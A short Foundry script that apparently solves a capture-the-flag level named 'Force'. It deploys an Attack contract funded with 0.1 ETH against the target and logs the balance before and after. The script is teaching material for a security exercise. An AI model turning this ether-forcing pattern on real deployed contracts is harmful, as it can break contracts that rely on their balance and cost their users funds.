// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Force.sol";
import "../src/Attack.sol";

contract ForceSolution is Script {
    Force public forceInstance = Force(payable(<Contract_address>));  // REPLACE!

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial Balance:", address(forceInstance).balance);

        // Attack contract deploy with 0.1 ETH 
        Attack attacker = new Attack{value: 0.1 ether}(address(forceInstance));

        // Attack  
        attacker.attack();

        console.log("Final Balance:", address(forceInstance).balance);

        vm.stopBroadcast();
    }
}

